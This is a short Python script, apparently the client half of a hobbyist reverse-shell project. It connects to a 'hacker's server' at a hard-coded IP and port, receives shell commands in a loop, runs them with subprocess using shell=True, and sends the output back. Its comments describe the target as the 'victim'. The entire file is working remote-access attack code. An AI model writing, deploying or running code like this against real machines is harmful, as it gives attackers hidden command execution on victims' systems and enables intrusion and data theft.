import socket
import os
import subprocess

#S1. create socket
s=socket.socket()
host= '192.168.29.1'       #ip address of hacker's server
port=9998                  #port of both server.py and client.py has to be same

#S2. binding host and port together and connect to hacker's server
s.connect((host,port))

#S3. wait for instructions

#S4. receive instructions and run them
while True:
    data=s.recv(1024)
#S5. perform data check for cd and executing the cd command received from the hacker's server:
    if(data[:2].decode('utf-8')=='cd'):
        os.chdir(data[3:].decode('utf-8'))
        
#S6. excuting other commands
    if(len(data)>0):
        #subprocess.Popen opens the terminal and executes the data cmds and shell=true gives us access to execute shell cmds
        cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)  
        
#S7. now the cmds have been executed, we need to send the output to hacker's server
        outputByte=cmd.stdout.read() + cmd.stderr.read()
        outputString=str(outputByte,"utf-8")
        currentWD= os.getcwd()+">"
        
#OUTPUT1: sent to hacker's server in form of bytes
        s.send(str.encode(outputString+currentWD))
#OUTPUT2: string to be displayed on the victim's server, if you are friend-->send the above same to same, if you are hacker->dont bother:)
        print(outputString)